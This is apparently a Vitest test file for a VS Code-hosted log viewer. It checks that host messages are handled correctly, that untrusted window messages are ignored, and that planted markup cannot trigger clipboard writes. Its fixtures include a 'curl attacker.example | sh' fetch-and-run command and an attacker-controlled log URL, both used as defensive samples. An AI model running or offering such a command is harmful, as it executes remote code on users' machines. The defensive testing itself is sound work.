// @vitest-environment jsdom
import { QueryClientProvider } from "@tanstack/react-query";
import { act, cleanup, render, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { ResizeObserverStub } from "@tsmono/react/testing";

import { getAppConfig } from "../app_config";
import { testClientAPI } from "../client/api/testClientApi";
import {
  installVscodeHost,
  uninstallVscodeHost,
} from "../client/api/vscode/testExtensionHost";
import { queryClient } from "../state/queryClient";
import { startTestApp, stopTestApp } from "../test/testApp";

import { AppContent } from "./App";
import { getAppRouter } from "./routing/AppRouter";

// The empty listing's sync is what a host `backgroundUpdate` visibly re-runs.

const getLogs = vi.fn(() =>
  Promise.resolve({ files: [], response_type: "full" as const })
);

// Never answers the http_request proxy: nothing here reads the re-pointed dir.
const vscodeHost = {
  postMessage: () => {},
  getState: () => undefined,
  setState: () => {},
};

const location = () => getAppRouter().state.location;

const postHostMessage = (data: unknown) => {
  act(() => {
    window.dispatchEvent(new MessageEvent("message", { data }));
  });
};

const syncQueries = () =>
  queryClient.getQueryCache().findAll({ queryKey: ["log_data", "sync"] });

const renderApp = async () => {
  render(
    <QueryClientProvider client={queryClient}>
      <AppContent />
    </QueryClientProvider>
  );
  // Settled: the listing panel's sync has completed. An invalidation landing
  // during a query's first fetch is absorbed by that fetch, so a host event
  // posted earlier would not re-sync.
  await waitFor(() => {
    const syncs = syncQueries();
    expect(syncs.length).toBeGreaterThan(0);
    for (const sync of syncs) {
      expect(sync.state.status).toBe("success");
      expect(sync.state.fetchStatus).toBe("idle");
    }
  });
  expect(getLogs).toHaveBeenCalled();
};

beforeEach(async () => {
  // Browser APIs jsdom lacks, which the app's layout reads.
  vi.stubGlobal("matchMedia", (query: string): MediaQueryList =>
    Object.assign(new EventTarget(), {
      matches: false,
      media: query,
      onchange: null,
      addListener: () => {},
      removeListener: () => {},
    })
  );
  vi.stubGlobal("ResizeObserver", ResizeObserverStub);
  startTestApp({
    logDir: "file:///logs",
    singleFileMode: false,
    api: testClientAPI({
      get_logs: getLogs,
      get_log_summaries_settled: () => Promise.resolve([]),
      get_eval_set: () => Promise.resolve(undefined),
      get_flow: () => Promise.resolve(undefined),
      client_events: () => Promise.resolve([]),
    }),
  });
  await act(async () => {
    await getAppRouter().navigate("/");
  });
});

afterEach(async () => {
  cleanup();
  await stopTestApp();
  uninstallVscodeHost();
  getLogs.mockClear();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

describe("in VS Code", () => {
  beforeEach(() => {
    installVscodeHost(vscodeHost, ["http_request"]);
  });

  it("backgroundUpdate refreshes the listing and leaves the selected log alone", async () => {
    // The host posts backgroundUpdate while the webview is unfocused.
    vi.spyOn(document, "hasFocus").mockReturnValue(false);
    await renderApp();
    const syncs = getLogs.mock.calls.length;
    const before = location();

    postHostMessage({
      type: "backgroundUpdate",
      url: "/logs/new.eval",
      log_dir: "file:///logs",
    });

    await waitFor(() =>
      expect(getLogs.mock.calls.length).toBeGreaterThan(syncs)
    );
    expect(location()).toBe(before);
    expect(getAppConfig().logDir).toBe("file:///logs");
  });

  it("updateState re-points the log root at the host's file", async () => {
    await renderApp();

    postHostMessage({ type: "updateState", url: "file:///other/run.eval" });

    expect(getAppConfig().logDir).toBe("file:///other");
    await waitFor(() => expect(location().pathname).toBe("/logs/run.eval"));
  });

  it("does not navigate again when the host replays its command on focus", async () => {
    await renderApp();
    const command = { type: "updateState", url: "file:///logs/new.eval" };
    postHostMessage(command);
    await waitFor(() => expect(location().pathname).toBe("/logs/new.eval"));
    const navigated = location();

    postHostMessage(command);

    // A replace navigation would mint a new location even to the same path.
    expect(location()).toBe(navigated);
  });
});

describe("outside VS Code", () => {
  it("ignores window messages: an embedding page can't choose the log location", async () => {
    await renderApp();
    const syncs = getLogs.mock.calls.length;
    const before = location();

    postHostMessage({
      type: "updateState",
      url: "https://attacker.example/logs/run.eval",
    });
    postHostMessage({
      type: "backgroundUpdate",
      url: "/logs/new.eval",
      log_dir: "file:///logs",
    });

    expect(getAppConfig().logDir).toBe("file:///logs");
    expect(location()).toBe(before);
    // A listing refresh invalidates the sync queries synchronously, on the
    // message; none were.
    for (const sync of syncQueries()) {
      expect(sync.state.isInvalidated).toBe(false);
      expect(sync.state.fetchStatus).toBe("idle");
    }
    expect(getLogs.mock.calls.length).toBe(syncs);
  });
});

describe("log-authored markup", () => {
  // jsdom has no clipboard; a delegate-based copier falls back to
  // document.execCommand("copy"), which is the observable we deny.
  const execCommand = vi.fn(() => true);
  // What a sanitized MathJax \href payload can plant in the DOM.
  const planted = document.createElement("a");
  planted.className = "copy-button";
  planted.setAttribute("data-clipboard-text", "curl attacker.example | sh");
  planted.textContent = "harmless-looking link";

  beforeEach(() => {
    Object.defineProperty(document, "execCommand", {
      value: execCommand,
      configurable: true,
    });
    document.body.appendChild(planted);
  });
  afterEach(() => {
    planted.remove();
    // jsdom defines no execCommand, so restoring means removing the property.
    delete (document as Partial<Document>).execCommand;
  });

  it("cannot trigger a clipboard write by carrying copy-button classes", async () => {
    await renderApp();

    act(() => {
      planted.click();
    });

    expect(execCommand).not.toHaveBeenCalled();
  });
});
